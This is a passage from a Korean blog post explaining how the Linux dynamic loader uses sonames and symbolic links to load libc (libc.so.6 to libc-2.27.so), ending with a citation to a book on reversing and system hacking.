아무튼, 앞서 잠깐 언급했던 파일 실행 시의 행위를 이제 알아낸 정보를 이용해 더 구체화해 보자. 앞서 알아보았듯 해당 파일에게 지정된 Dynamic Loader는 `[ld-](http://ld-2.27.so)linux.so.2` 인데, 심볼릭 링크 정책으로 인해 실제로는 `[ld-2.27.so](http://ld-2.27.so)` 가 사용된다. 파일 실행 시 트리거된 Dynamic Loader는 soname을 이용해 어떤 라이브러리를 사용할지 찾아낸다. 

여기에서 soname을 가진 라이브러리는 `libc.so.6`이기 때문에 Dynamic Loader는 `libc.so.6` 을 실행시킴으로써 메모리에 적재하려 한다. 그런데, 심볼릭 링크 정책으로 인해 `[libc-2.27.so](http://libc-2.27.so)` 가 실행되며 메모리에 적재된다. 이로 인해 실행 상태인 프로그램에 사용된 라이브러리를 사용하면 `libc.so.6` 으로 뜨지 않는다.

마지막 의문이 하나 생긴다. 왜 굳이? 왜 굳이 이렇게 심볼릭 링크를 써서 돌아 돌아 가는 것일까? 그 이유는 라이브러리 연결의 호환성을 좋게 하기 위해서이다. 통상적으로 `{library_name.so.1.5}->{library_name.so}` 의 구도로 링크가 걸리는데, 이는 개발 환경에 `.so.1.5` 버전의 라이브러리뿐 아니라 다른 버전의 라이브러리도 존재할 수 있기 때문에 어떤 버전(어떤 soname)을 사용하든 안정적으로 필요한 Linker name을 가진 라이브러리와 연결해주기 위해서 생겨난 방식이다.

---

# 4. 참고문헌

- x64dbg 디버거를 활용한 리버싱과 시스템 해킹의 원리(김민수 저, 210p RTL)